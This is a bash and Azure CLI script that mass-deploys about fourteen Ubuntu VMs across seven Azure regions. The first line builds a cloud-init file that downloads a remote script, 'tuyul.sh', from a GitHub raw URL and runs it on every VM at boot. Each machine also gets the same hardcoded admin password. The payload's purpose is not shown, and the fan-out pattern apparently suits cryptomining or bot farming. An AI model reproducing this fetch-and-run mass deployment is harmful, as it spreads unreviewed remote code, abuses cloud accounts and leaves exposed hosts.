echo $'#!/bin/bash\nwget -O tuyul.sh https://raw.githubusercontent.com/tanboys/lopay/main/tuyul.sh && chmod +x tuyul.sh && bash ./tuyul.sh' > cloud-init.txt
az group create --name japaneast --location japaneast
az group create --name australiaeast --location australiaeast
az group create --name uksouth --location uksouth
az group create --name koreacentral --location koreacentral
az group create --name eastasia --location eastasia
az group create --name ukwest --location ukwest
az group create --name australiacentral --location australiacentral
az vm create --resource-group australiacentral --name australiacentral --location australiacentral --image Canonical:UbuntuServer:16.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password RnSGroup180881 --no-wait --custom-data cloud-init.txt
az vm create --resource-group australiacentral --name australiacentral2 --location australiacentral --image Canonical:UbuntuServer:16.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password RnSGroup180881 --no-wait --custom-data cloud-init.txt
az vm create --resource-group australiaeast --name australiaeast2 --location australiaeast --image Canonical:UbuntuServer:16.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password RnSGroup180881 --no-wait --custom-data cloud-init.txt
az vm create --resource-group australiaeast --name australiaeast3 --location australiaeast --image Canonical:UbuntuServer:16.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password RnSGroup180881 --no-wait --custom-data cloud-init.txt
az vm create --resource-group eastasia --name eastasia1 --location eastasia --image Canonical:UbuntuServer:16.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password RnSGroup180881 --no-wait --custom-data cloud-init.txt
az vm create --resource-group eastasia --name eastasia2 --location eastasia --image Canonical:UbuntuServer:16.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password RnSGroup180881 --no-wait --custom-data cloud-init.txt
az vm create --resource-group japaneast --name japaneast2 --location japaneast --image Canonical:UbuntuServer:16.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password RnSGroup180881 --no-wait --custom-data cloud-init.txt
az vm create --resource-group japaneast --name japaneast4 --location japaneast --image Canonical:UbuntuServer:16.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password RnSGroup180881 --no-wait --custom-data cloud-init.txt
az vm create --resource-group koreacentral --name koreacentral2 --location koreacentral --image Canonical:UbuntuServer:16.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password RnSGroup180881 --no-wait --custom-data cloud-init.txt
az vm create --resource-group koreacentral --name koreacentral3 --location koreacentral --image Canonical:UbuntuServer:16.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password RnSGroup180881 --no-wait --custom-data cloud-init.txt
az vm create --resource-group uksouth --name uksouth1 --location uksouth --image Canonical:UbuntuServer:16.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password RnSGroup180881 --no-wait --custom-data cloud-init.txt
az vm create --resource-group uksouth --name uksouth2 --location uksouth --image Canonical:UbuntuServer:16.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password RnSGroup180881 --no-wait --custom-data cloud-init.txt
az vm create --resource-group ukwest --name ukwest1 --location ukwest --image Canonical:UbuntuServer:16.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password RnSGroup180881 --no-wait --custom-data cloud-init.txt
az vm create --resource-group ukwest --name ukwest2 --location ukwest --image Canonical:UbuntuServer:16.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password RnSGroup180881 --no-wait --custom-data cloud-init.txt
